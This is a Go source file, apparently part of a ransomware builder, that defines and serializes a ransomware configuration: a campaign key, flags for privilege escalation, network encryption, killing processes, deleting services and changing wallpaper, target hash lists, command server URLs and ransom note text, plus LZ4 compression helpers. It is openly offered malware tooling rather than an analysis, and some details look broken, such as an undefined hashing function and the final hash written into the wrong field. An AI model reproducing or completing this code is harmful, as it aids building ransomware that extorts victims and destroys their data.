package main

import (
	"bytes"
	"encoding/binary"
	"io"

	"github.com/pierrec/lz4/v4"
)

func compress(input []byte) ([]byte, error) {
	var buff bytes.Buffer
	writer := lz4.NewWriter(&buff)
	_, err := writer.Write(input)

	if err != nil {
		return nil, err
	}
	writer.Close()
	return buff.Bytes(), nil
}

func decompress(input []byte) ([]byte, error) {
	var out []byte
	buffer := make([]byte, 64)
	reader := lz4.NewReader(bytes.NewReader(input))

	for {
		numBytes, err := reader.Read(buffer)

		if err != nil && err != io.EOF {
			return nil, err
		}
		out = append(out, buffer[:numBytes]...)

		if err == io.EOF {
			break
		}
	}
	return out, nil
}

type Configuration struct {
	version                 []int
	campaignKey             [32]byte
	largeFileEncryptFlag    bool
	privilegeEscalationFlag bool
	networkEncryptFlag      bool
	terminateProcessFlag    bool
	deleteServiceFlag       bool
	wallpaperFlag           bool
	runOnceFlag             bool
	serverCommunicationFlag bool
	processHashList         []uint32
	serviceHashList         []uint32
	remoteServerURLList     [][]byte
	ransomNoteContent       []byte
	ransomNoteContentHash   uint32
	runOnceString           []byte
	fileHashList            []uint32
	folderHashList          []uint32
	extensionHashList       []uint32
	configurationHash       uint32
}

func createConfiguration() (*Configuration, error) {
	config := Configuration{}
	return &config, nil
}

func (config *Configuration) setVersion(version []int) {
	config.version = version
}

func (config *Configuration) setCampaignKey(campaignKey [32]byte) {
	config.campaignKey = campaignKey
}

func (config *Configuration) setFlags(flags []bool) {
	config.largeFileEncryptFlag = flags[0]
	config.privilegeEscalationFlag = flags[1]
	config.networkEncryptFlag = flags[2]
	config.terminateProcessFlag = flags[3]
	config.deleteServiceFlag = flags[4]
	config.wallpaperFlag = flags[5]
	config.runOnceFlag = flags[6]
	config.serverCommunicationFlag = flags[7]
}

func (config *Configuration) setProcessHashList(processHashList []uint32) {
	config.processHashList = processHashList
}

func (config *Configuration) appendProcessHashList(hash uint32) {
	config.processHashList = append(config.processHashList, hash)
}

func (config *Configuration) removeProcessHashList(hash uint32) {
	for index, eachHash := range config.processHashList {
		if eachHash == hash {
			config.processHashList = append(config.processHashList[:index], config.processHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setFileHashList(fileHashList []uint32) {
	config.fileHashList = fileHashList
}

func (config *Configuration) appendFileHashList(hash uint32) {
	config.fileHashList = append(config.fileHashList, hash)
}

func (config *Configuration) removeFileHashList(hash uint32) {
	for index, eachHash := range config.fileHashList {
		if eachHash == hash {
			config.fileHashList = append(config.fileHashList[:index], config.fileHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setFolderHashList(folderHashList []uint32) {
	config.folderHashList = folderHashList
}

func (config *Configuration) appendFolderHashList(hash uint32) {
	config.folderHashList = append(config.folderHashList, hash)
}

func (config *Configuration) removeFolderHashList(hash uint32) {
	for index, eachHash := range config.folderHashList {
		if eachHash == hash {
			config.folderHashList = append(config.folderHashList[:index], config.folderHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setExtensionHashList(extensionHashList []uint32) {
	config.extensionHashList = extensionHashList
}

func (config *Configuration) appendExtensionHashList(hash uint32) {
	config.extensionHashList = append(config.extensionHashList, hash)
}

func (config *Configuration) removeExtensionHashList(hash uint32) {
	for index, eachHash := range config.extensionHashList {
		if eachHash == hash {
			config.extensionHashList = append(config.extensionHashList[:index], config.extensionHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setServiceHashList(serviceHashList []uint32) {
	config.serviceHashList = serviceHashList
}

func (config *Configuration) appendServiceHashList(hash uint32) {
	config.serviceHashList = append(config.serviceHashList, hash)
}

func (config *Configuration) removeServiceHashList(hash uint32) {
	for index, eachHash := range config.serviceHashList {
		if eachHash == hash {
			config.serviceHashList = append(config.serviceHashList[:index], config.serviceHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setRemoteServerURLList(remoteServerURLList [][]byte) {
	config.remoteServerURLList = remoteServerURLList
}

func (config *Configuration) addRemoteServerURLList(remoteServerURL []byte) {
	config.remoteServerURLList = append(config.remoteServerURLList, remoteServerURL)
}

func (config *Configuration) setRansomNoteContent(ransomNoteContent []byte) {
	config.ransomNoteContent = ransomNoteContent
}

func (config *Configuration) setRansomNoteContentHash(ransomNoteContentHash uint32) {
	config.ransomNoteContentHash = ransomNoteContentHash
}

func (config *Configuration) setConfigurationHash(configurationHash uint32) {
	config.configurationHash = configurationHash
}

func (config *Configuration) setRunOnceString(runOnceString []byte) {
	config.runOnceString = runOnceString
}

// note:implement for when fields are empty
func (config *Configuration) toBytes() []byte {
	var result []byte

	separator := []byte("@cPeterr")

	// add version

	for _, val := range config.version {
		result = append(result, byte(val))
	}
	result = append(result, separator...)

	// add campaignKey
	result = append(result, config.campaignKey[:]...)

	// add flags
	flags := []bool{config.largeFileEncryptFlag, config.privilegeEscalationFlag, config.networkEncryptFlag,
		config.terminateProcessFlag, config.deleteServiceFlag, config.wallpaperFlag, config.runOnceFlag, config.serverCommunicationFlag}

	for _, flag := range flags {
		if flag {
			result = append(result, byte(1))
		} else {
			result = append(result, byte(0))
		}
	}

	result = append(result, separator...)

	// add process hash list
	hashBuffer := make([]byte, 8)

	for _, eachHash := range config.processHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}

	result = append(result, separator...)

	// add service hash list

	for _, eachHash := range config.serviceHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}

	result = append(result, separator...)

	// add remote server url list

	for _, urlBuffer := range config.remoteServerURLList {
		result = append(result, urlBuffer...)
		result = append(result, []byte("yeet")...)
	}

	result = append(result, separator...)

	// add ransomNoteContent
	result = append(result, config.ransomNoteContent...)

	result = append(result, separator...)

	// add ransomNoteContentHash
	binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
	result = append(result, hashBuffer...)
	result = append(result, separator...)

	// add runOncestring
	result = append(result, config.runOnceString...)
	result = append(result, separator...)

	// add fileHashList

	for _, eachHash := range config.fileHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}
	result = append(result, separator...)

	// add folderHashList

	for _, eachHash := range config.folderHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}
	result = append(result, separator...)

	// add extensionHashList
	for _, eachHash := range config.extensionHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}
	result = append(result, separator...)

	config.ransomNoteContentHash = bufferHashing(result)
	// add configurationHash
	binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
	result = append(result, hashBuffer...)
	result = append(result, separator...)
	return result
}
